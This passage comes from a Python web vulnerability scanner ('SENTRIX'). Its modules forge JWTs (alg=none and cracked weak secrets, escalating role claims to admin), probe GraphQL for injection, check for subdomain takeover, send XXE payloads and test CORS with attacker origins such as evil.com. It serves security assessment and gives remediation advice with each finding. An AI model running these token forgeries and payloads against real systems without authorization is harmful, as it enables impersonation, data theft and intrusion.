    for original_token, source_url in list(found_tokens.items())[:5]:
        parts = original_token.split(".")
        if len(parts) != 3:
            continue

        header = _decode_part(parts[0])
        payload = _decode_part(parts[1])
        if not header or not payload:
            continue

        alg = header.get("alg", "").upper()
        log(f"JWT: testing token (alg={alg}) from {urlparse(source_url).path}", "info")

        # ── Attack 1: none algorithm ─────────────────────────────────
        # Forge a token with alg=none, no signature — some servers accept it
        for none_variant in ["none", "None", "NONE", "nOnE"]:
            none_header = dict(header)
            none_header["alg"] = none_variant
            forged_payload = dict(payload)
            # Escalate privileges if possible
            for key in ["role", "admin", "isAdmin", "is_admin", "type", "scope"]:
                if key in forged_payload:
                    forged_payload[key] = "admin" if isinstance(forged_payload[key], str) else True
            forged = f"{_b64url(none_header)}.{_b64url(forged_payload)}."
            result = _send_jwt(source_url, forged, "JWT None Algorithm",
                f"Forged token accepted with alg={none_variant}, no signature. Original alg: {alg}")
            if result:
                url_, name_, evidence_, status_ = result
                add_finding("JWT None Algorithm Attack",
                    "critical", urlparse(url_).path,
                    f"Server accepts JWT with 'alg: {none_variant}' — signature not verified. "
                    f"Attacker can forge any token and impersonate any user.",
                    f"Bearer {forged[:80]}...",
                    "Explicitly reject 'none' algorithm. Use a strict allowlist of accepted algorithms.")
                break

        # ── Attack 2: Algorithm Confusion (RS256 → HS256) ───────────────
        # If server uses RS256, sign with public key as HMAC secret
        if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
            # Try to fetch public key from common JWKS endpoints
            parsed = urlparse(target)
            base = f"{parsed.scheme}://{parsed.netloc}"
            jwks_paths = ["/.well-known/jwks.json", "/jwks.json", "/api/jwks",
                          "/.well-known/openid-configuration", "/auth/jwks"]
            for jwks_path in jwks_paths:
                try:
                    resp = safe_get(base + jwks_path, headers=headers, timeout=6, verify=False)
                    if resp.status_code == 200 and "keys" in resp.text:
                        add_finding("JWT Algorithm Confusion (Potential)",
                            "high", jwks_path,
                            f"JWKS endpoint exposed and server uses {alg}. "
                            f"If public key is used as HS256 HMAC secret, attacker can forge tokens.",
                            f"GET {jwks_path} → 200 OK, public key exposed. Token alg: {alg}",
                            "Use strict algorithm allowlist. Never accept both symmetric and asymmetric algs.")
                        break
                except Exception:
                    pass

        # ── Attack 3: Weak Secret Brute Force ───────────────────────────
        if alg in ("HS256", "HS384", "HS512"):
            hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
            signing_input = f"{parts[0]}.{parts[1]}".encode()
            original_sig = parts[2]
            # Normalize base64url comparison
            def _b64url_encode(data):
                return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

            cracked_secret = None
            for secret in JWT_WEAK_SECRETS:
                sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
                if _b64url_encode(sig) == original_sig:
                    cracked_secret = secret
                    break

            if cracked_secret:
                # Forge escalated token
                forged_payload = dict(payload)
                for key in ["role", "admin", "isAdmin", "is_admin", "type"]:
                    if key in forged_payload:
                        forged_payload[key] = "admin" if isinstance(forged_payload[key], str) else True
                new_signing_input = f"{parts[0]}.{_b64url(forged_payload)}".encode()
                new_sig = hmac.new(cracked_secret.encode(), new_signing_input, hash_fn).digest()
                forged = f"{parts[0]}.{_b64url(forged_payload)}.{_b64url_encode(new_sig)}"
                add_finding("JWT Weak Secret", "critical",
                    urlparse(source_url).path,
                    f"JWT signed with weak secret '{cracked_secret}'. "
                    f"Attacker can forge tokens with arbitrary claims (e.g. role=admin).",
                    f"Secret cracked: '{cracked_secret}'. Forged token: {forged[:80]}...",
                    "Use cryptographically random secret ≥32 bytes. Never use dictionary words.")


# ═══════════════════════════════════════════════════════════════
# ROUND 3 MODULE B: GRAPHQL TESTING
# Introspection enabled + injection via arguments
# ═══════════════════════════════════════════════════════════════
def test_graphql(target, urls, headers):
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # Build candidate GraphQL endpoints from discovered URLs + common paths
    candidates = set()
    for path in GRAPHQL_PATHS:
        candidates.add(base + path)
    for url in urls:
        if any(kw in url.lower() for kw in ["graphql", "graphiql", "gql", "/graph"]):
            candidates.add(url)

    if not candidates:
        log("GraphQL: no endpoints found — skipping", "muted")
        return

    log(f"GraphQL: probing {len(candidates)} endpoint(s)...")

    post_headers = headers.copy()
    post_headers["Content-Type"] = "application/json"

    found_gql = set()

    def _probe_graphql(url):
        # First confirm it's a GraphQL endpoint
        try:
            resp = safe_post(url, headers=post_headers, data=GRAPHQL_INTROSPECTION_QUERY, timeout=8, verify=False)
            if resp.status_code not in (200, 400, 401):
                return

            body = resp.text.lower()
            is_graphql = any(indicator in body for indicator in [
                '"data"', '"errors"', '"__schema"', 'graphql', '"typename"'
            ])
            if not is_graphql:
                return

            path = urlparse(url).path
            found_gql.add(url)
            log(f"GraphQL: endpoint confirmed at {path}", "info")

            # ── Test 1: Introspection enabled ───────────────────────────
            if '"__schema"' in resp.text and '"types"' in resp.text:
                # Count exposed types
                type_count = resp.text.count('"name"')
                add_finding("GraphQL Introspection Enabled",
                    "medium", path,
                    f"GraphQL introspection is enabled in production. Exposes full schema "
                    f"including all types, queries, mutations, and field names (~{type_count} entries). "
                    f"Allows attackers to map the entire API surface.",
                    GRAPHQL_INTROSPECTION_QUERY,
                    "Disable introspection in production: set introspection=False. "
                    "Use persisted queries and query allowlists.")

            # ── Test 2: Error message leakage ───────────────────────────
            # Send broken query to trigger error
            try:
                err_resp = safe_post(url, headers=post_headers,
                    data='{"query":"{__typename invalid_field}"}', timeout=6, verify=False)
                err_body = err_resp.text
                if '"errors"' in err_body and any(w in err_body for w in [
                    "stacktrace", "stack_trace", "line ", "column ", "resolver",
                    "Cannot query field", "Unknown argument"
                ]):
                    add_finding("GraphQL Verbose Error Messages",
                        "low", path,
                        "GraphQL returns detailed error messages including field names, "
                        "resolver hints, or stack traces. Aids attackers in API enumeration.",
                        '{"query":"{__typename invalid_field}"} → detailed errors',
                        "Configure GraphQL to return generic error messages in production.")
            except Exception:
                pass

            # ── Test 3: Injection via arguments ─────────────────────────
            for payload in GRAPHQL_INJECTION_PAYLOADS:
                try:
                    inj_resp = safe_post(url, headers=post_headers, data=payload,
                        timeout=8, verify=False)
                    inj_body = inj_resp.text

                    # SQLi signatures in GraphQL response
                    sql_hit = any(err.lower() in inj_body.lower() for err in SQL_ERRORS)
                    # Data leakage — returned extra fields like password
                    data_hit = any(w in inj_body.lower() for w in [
                        '"password"', '"hash"', '"secret"', '"token"', '"ssn"', '"credit'
                    ])

                    if sql_hit:
                        add_finding("GraphQL SQL Injection",
                            "critical", path,
                            "GraphQL resolver passes user-controlled arguments directly to SQL. "
                            "SQL error signature detected in response.",
                            f"POST {path} payload: {payload[:120]}",
                            "Use parameterized queries in all resolvers. Validate and sanitize all input.")
                        break
                    elif data_hit and '"errors"' not in inj_body:
                        add_finding("GraphQL Sensitive Field Exposure",
                            "high", path,
                            "GraphQL query returned sensitive fields (password/token/secret) "
                            "without authorization checks.",
                            f"POST {path} payload: {payload[:120]}",
                            "Implement field-level authorization. Never expose sensitive fields.")
                        break
                except Exception:
                    continue

            # ── Test 4: Batch query abuse ────────────────────────────────
            try:
                batch_payload = json.dumps([
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                ])
                batch_resp = safe_post(url, headers=post_headers, data=batch_payload,
                    timeout=8, verify=False)
                if batch_resp.status_code == 200 and batch_resp.text.startswith("["):
                    add_finding("GraphQL Batch Queries Enabled",
                        "low", path,
                        "GraphQL accepts batched query arrays. Enables rate-limit bypass "
                        "and brute-force amplification attacks.",
                        f"POST {path} with array of 5 queries → 200 OK",
                        "Disable or limit batch queries. Implement query complexity limits.")
            except Exception:
                pass

        except Exception:
            pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        list(ex.map(_probe_graphql, candidates))


# ═══════════════════════════════════════════════════════════════
# ROUND 3 MODULE C: SUBDOMAIN TAKEOVER
# CNAME dangling detection + fingerprint matching
# ═══════════════════════════════════════════════════════════════
def test_subdomain_takeover(target, headers):
    import socket
    parsed = urlparse(target)
    base_domain = parsed.netloc.split(":")[0]  # strip port

    log(f"Subdomain takeover: enumerating subdomains of {base_domain}...")

    # Build subdomain wordlist (common + discovered from crawl JS)
    SUBDOMAIN_PREFIXES = [
        "www", "mail", "api", "dev", "staging", "test", "beta", "app",
        "admin", "blog", "shop", "store", "portal", "dashboard", "cdn",
        "static", "assets", "images", "media", "uploads", "files",
        "support", "help", "docs", "status", "monitor", "metrics",
        "auth", "login", "sso", "account", "accounts", "my",
        "mobile", "m", "wap", "api2", "api-v2", "v2", "v1",
        "old", "legacy", "backup", "new", "next", "preview",
        "internal", "intranet", "vpn", "remote", "secure",
        "sandbox", "uat", "qa", "rc", "release", "hotfix",
        "newsletter", "forum", "community", "wiki", "kb",
        "data", "analytics", "tracking", "events",
    ]

    # Extract any subdomain references from the base domain
    # e.g. if target is sub.example.com, try example.com parts too
    parts = base_domain.split(".")
    # Only test if domain is reasonable length (not an IP)
    if len(parts) < 2 or parts[-1].isdigit():
        log("Subdomain takeover: target appears to be IP — skipping", "muted")
        return

    # The registrable domain (last 2 parts, or 3 for co.uk etc.)
    root_domain = ".".join(parts[-2:])
    if len(parts[-1]) == 2 and len(parts) >= 3:  # country TLD heuristic
        root_domain = ".".join(parts[-3:])

    candidates = [f"{prefix}.{root_domain}" for prefix in SUBDOMAIN_PREFIXES]
    log(f"Subdomain takeover: testing {len(candidates)} subdomains...", "info")

    vulnerable = []

    def _check_subdomain(subdomain):
        # Step 1: DNS lookup — must resolve
        try:
            ip = socket.gethostbyname(subdomain)
        except socket.gaierror:
            return None  # NXDOMAIN / no record — skip

        # Step 2: Check for dangling CNAME via HTTP response fingerprint
        sub_url = f"https://{subdomain}"
        try:
            resp = safe_get(sub_url, headers=headers, timeout=7, verify=False,
                           allow_redirects=True)
            resp_text = resp.text
            final_url = resp.url
        except requests.exceptions.SSLError:
            try:
                sub_url = f"http://{subdomain}"
                resp = safe_get(sub_url, headers=headers, timeout=7, verify=False,
                               allow_redirects=True)
                resp_text = resp.text
                final_url = resp.url
            except Exception:
                return None
        except Exception:
            return None

        # Step 3: Match against known takeover fingerprints
        final_host = urlparse(final_url).netloc.lower()
        for service, cname_suffix, body_fingerprints in SUBDOMAIN_TAKEOVER_FINGERPRINTS:
            # CNAME check: final URL redirected to a known unclaimed service?
            cname_match = cname_suffix.lower() in final_host
            # Body fingerprint check
            body_match = any(fp.lower() in resp_text.lower() for fp in body_fingerprints if fp)

            if body_match or (cname_match and resp.status_code in [404, 400, 410]):
                return (subdomain, service, final_url, resp.status_code,
                        f"Resolved to {ip}, redirected to {final_host}. "
                        f"Body contains takeover fingerprint for {service}.")
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=min(THREADS, 10)) as ex:
        futures = {ex.submit(_check_subdomain, sub): sub for sub in candidates}
        for fut in concurrent.futures.as_completed(futures):
            result = fut.result()
            if result:
                subdomain, service, final_url, status, evidence = result
                vulnerable.append(subdomain)
                add_finding(f"Subdomain Takeover ({service})",
                    "high", subdomain,
                    f"Subdomain {subdomain} resolves but points to an unclaimed "
                    f"{service} resource. Attacker can register this resource and serve "
                    f"malicious content from your trusted subdomain.",
                    f"GET {subdomain} → {status} — {evidence}",
                    f"Remove dangling DNS record for {subdomain}, or claim the {service} "
                    f"resource. Regularly audit DNS records against live services.")

    if not vulnerable:
        log("Subdomain takeover: no vulnerable subdomains found", "muted")


# ═══════════════════════════════════════════════════════════════
# ROUND 3 MODULE D: XXE INJECTION
# Classic read, SSRF via XXE, parameter entity, PHP filter
# ═══════════════════════════════════════════════════════════════
def test_xxe(target, urls, forms, headers):
    log(f"XXE: testing {len(forms)} forms and XML-accepting endpoints...")

    # Gather XML-accepting endpoints: forms + endpoints that look like APIs
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    xml_endpoints = []

    # 1. Forms that POST to XML-consuming paths
    for form in forms:
        action = form.get("action", target)
        if form.get("method", "get").lower() == "post":
            xml_endpoints.append(("form", action, form.get("inputs", [])))

    # 2. URLs that suggest XML processing
    xml_keywords = ["xml", "soap", "wsdl", "upload", "import", "parse",
                    "feed", "rss", "atom", "convert", "transform"]
    for url in urls:
        if any(kw in url.lower() for kw in xml_keywords):
            xml_endpoints.append(("url", url, []))

    # 3. Common XML API paths
    for path in ["/api/upload", "/api/import", "/upload", "/import",
                 "/parse", "/convert", "/feed", "/rss", "/atom",
                 "/ws", "/service", "/soap", "/api/xml"]:
        xml_endpoints.append(("path", base + path, []))

    if not xml_endpoints:
        log("XXE: no XML endpoints identified — skipping", "muted")
        return

    # Deduplicate
    seen_urls = set()
    deduped = []
    for kind, url, inputs in xml_endpoints:
        if url not in seen_urls:
            seen_urls.add(url)
            deduped.append((kind, url, inputs))
    xml_endpoints = deduped[:20]

    found_xxe = set()

    def _test_xxe_endpoint(args):
        kind, url, inputs = args
        path = urlparse(url).path
        endpoint_key = path

        if endpoint_key in found_xxe:
            return

        # Establish baseline — what does this endpoint return normally?
        # If it already returns 500 on a benign request, a 500 on XXE is not significant.
        try:
            baseline_headers = headers.copy()
            baseline_headers["Content-Type"] = "application/json"
            baseline_resp = safe_post(url, headers=baseline_headers,
                                      data="{}", timeout=8, verify=False)
            baseline_status = baseline_resp.status_code
        except Exception:
            baseline_status = 0

        for xxe_payload, signatures in XXE_PAYLOADS:
            for content_type in XXE_CONTENT_TYPES[:2]:  # Top 2 to limit requests
                try:
                    test_headers = headers.copy()
                    test_headers["Content-Type"] = content_type

                    # Build request body — try to embed in form field if available
                    if inputs and kind == "form":
                        # Put payload in first text-like field
                        data = {}
                        for inp in inputs:
                            if inp.get("type", "text") in ("text", "textarea", "hidden", ""):
                                data[inp["name"]] = xxe_payload
                                break
                        if not data:
                            # Fallback: send raw XML
                            resp = safe_post(url, headers=test_headers,
                                data=xxe_payload, timeout=10, verify=False)
                        else:
                            resp = safe_post(url, headers=test_headers,
                                data=data, timeout=10, verify=False)
                    else:
                        # Raw XML POST
                        resp = safe_post(url, headers=test_headers,
                            data=xxe_payload, timeout=10, verify=False)

                    # Check for successful file read
                    if signatures:
                        for sig in signatures:
                            if sig.lower() in resp.text.lower():
                                if endpoint_key not in found_xxe:
                                    found_xxe.add(endpoint_key)
                                    # Identify what was leaked
                                    if "root:x:" in resp.text or "root:!:" in resp.text:
                                        leaked = "/etc/passwd"
                                        severity = "critical"
                                    elif "win.ini" in resp.text.lower() or "[fonts]" in resp.text:
                                        leaked = "C:/windows/win.ini"
                                        severity = "critical"
                                    elif "ami-id" in resp.text or "instance-id" in resp.text:
                                        leaked = "AWS metadata"
                                        severity = "critical"
                                    else:
                                        leaked = "file system"
                                        severity = "high"
                                    add_finding("XXE Injection",
                                        severity, path,
                                        f"Server processes external XML entities. "
                                        f"Attacker can read local files ({leaked}), "
                                        f"perform SSRF, or cause denial of service.",
                                        f"POST {path} with XXE payload → leaked {leaked}",
                                        "Disable external entity processing: "
                                        "set FEATURE_SECURE_PROCESSING, disable DOCTYPE. "
                                        "Use JSON where possible instead of XML.")
                                return

                    # Blind XXE: only flag if baseline was NOT already 500
                    # A 500 on a brand-new endpoint means it rejects all bad input, not XXE
                    if resp.status_code == 500 and baseline_status not in (500, 0) and "xml" in resp.text.lower():
                        if endpoint_key not in found_xxe:
                            found_xxe.add(endpoint_key)
                            add_finding("XXE Injection (Potential — Blind)",
                                "medium", path,
                                "Endpoint returned 500 error when processing XXE payload. "
                                "May be vulnerable to blind XXE for SSRF or file read via OOB.",
                                f"POST {path} with XXE → HTTP 500",
                                "Disable external entity processing. "
                                "Validate and sanitize all XML input.")
                        return

                except Exception:
                    continue

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        list(ex.map(_test_xxe_endpoint, xml_endpoints[:15]))


# ═══════════════════════════════════════════════════════════════
# ROUND 3 MODULE E: CORS MISCONFIGURATION TESTING
# Origin reflection, null origin, subdomain bypass, credential leakage
# ═══════════════════════════════════════════════════════════════
def test_cors(target, urls, headers):
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    domain = parsed.netloc.split(":")[0]

    log("CORS: testing origin reflection, null origin, and subdomain bypasses...")

    # Build dynamic CORS test origins incorporating the target domain
    test_origins = [
        "https://evil.com",
        "null",
        "http://localhost",
        "https://127.0.0.1",
        f"https://{domain}.evil.com",          # postfix bypass
        f"https://evil.{domain}",               # subdomain-like bypass
        f"https://not{domain}",                 # prefix bypass
        f"http://{domain}",                     # HTTPS→HTTP downgrade
        f"https://sub.{domain}",                # legitimate subdomain
        f"https://attacker.com?{domain}",       # query bypass
    ]

    # Test on the most sensitive endpoints
    cors_test_urls = [target]
    for url in urls:
        if any(kw in url.lower() for kw in ["api", "user", "account", "auth",
                                              "admin", "profile", "data", "me"]):
            cors_test_urls.append(url)
    cors_test_urls = list(set(cors_test_urls))[:12]

    found_cors = set()         # (path, origin) already tested
    reported_behaviors = set() # (severity, title) already reported — global dedup

    def _test_cors_origin(args):
        url, origin = args
        path = urlparse(url).path
        key = f"{path}:{origin}"
        if key in found_cors:
            return

        try:
            test_headers = headers.copy()
            test_headers["Origin"] = origin

            resp = safe_get(url, headers=test_headers, timeout=8, verify=False)

            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            acam = resp.headers.get("Access-Control-Allow-Methods", "")

            if not acao:
                return

            # Severity determination
            origin_reflected = (acao == origin)
            wildcard = (acao == "*")
            null_origin = (origin == "null" and acao in ("null", "*", "null, null"))
            credentials_allowed = (acac == "true")
            allow_all_methods = any(m in acam for m in ["PUT", "DELETE", "PATCH"])

            if not any([origin_reflected, wildcard, null_origin]):
                return

            if key in found_cors:
                return
            found_cors.add(key)

            # Most dangerous: reflected origin + credentials
            if origin_reflected and credentials_allowed:
                severity = "critical"
                title = "CORS: Origin Reflected + Credentials Allowed"
                desc = (f"Server reflects attacker-controlled origin '{origin}' AND allows credentials. "
                        f"Attacker can make cross-origin authenticated requests from evil.com, "
                        f"stealing session tokens, API keys, or sensitive user data.")
            elif null_origin and credentials_allowed:
                severity = "high"
                title = "CORS: Null Origin + Credentials Allowed"
                desc = (f"Server allows null Origin with credentials. Attackers can use sandboxed "
                        f"iframes to generate null-origin requests and bypass CORS protections.")
            elif origin_reflected and not credentials_allowed:
                severity = "medium"
                title = "CORS: Arbitrary Origin Reflected"
                desc = (f"Server reflects arbitrary Origin '{origin}' without credential restrictions. "
                        f"Limits exploitation but still allows reading non-credentialed responses.")
            elif wildcard and credentials_allowed:
                severity = "high"
                title = "CORS: Wildcard + Credentials (Invalid Config)"
                desc = "ACAO: * with credentials is rejected by browsers but indicates misconfigured CORS logic."
            else:
                severity = "low"
                title = "CORS: Overly Permissive (Informational)"
                desc = f"Server reflects origin '{origin}'. Low risk without credentials flag."

            # Deduplicate: don't flood with one finding per URL for the same behavior.
            # For Low informational CORS, report only once per unique CORS behavior type.
            # For High/Critical, report per endpoint since those are actionable.
            behavior_key = title  # One Low CORS finding per behavior type globally
            if severity == "low" and behavior_key in reported_behaviors:
                return
            reported_behaviors.add(behavior_key)

            add_finding(title, severity, path, desc,
                f"Request: Origin: {origin}\n"
                f"Response: ACAO: {acao}, ACAC: {acac}, ACAM: {acam}",
                "Maintain explicit whitelist of trusted origins. "
                "Never use ACAO: * with Access-Control-Allow-Credentials: true. "
                "Validate Origin header server-side against whitelist.")

        except Exception:
            pass

    tasks = [(url, origin) for url in cors_test_urls for origin in test_origins]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        list(ex.map(_test_cors_origin, tasks))


# ═══════════════════════════════════════════════════════════════
# START SERVER
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()

    print("=" * 65)
    print("  SENTRIX Pro Edition v7.0 — Real Target Ready")
    print("=" * 65)
    print("  Round 4  : SPA catch-all FP elimination, content")
    print("             verification, JWT login POST collection,")
    print("             crawl URL sanitization, admin panel FP fix")
    print("  Backend  : http://localhost:5000")
    print("  Modules  : SQLi (Error+Boolean+Time), XSS (Context+WAF bypass),")
    print("             SSTI, CmdI, LFI, SSRF, Open Redirect,")
    print("             IDOR, Broken Auth, Headers, Secrets, SSL/TLS")
    print("  Round 2  : Context-Aware XSS, WAF Bypass, JSON API Testing,")
    print("             Hidden Parameter Discovery, Header Injection")
    print("  Round 3  : JWT (none/alg-confusion/weak-secret),")
    print("             GraphQL (introspection+injection+batch),")
    print("             Subdomain Takeover, XXE Injection, CORS Testing")
    print("  Rate     : True global token bucket — exact req/sec compliance")
    print("  Crawl    : Up to 500 pages + JS endpoint extraction")
    print("=" * 65)

    app.run(host="0.0.0.0", port=5000, debug=False)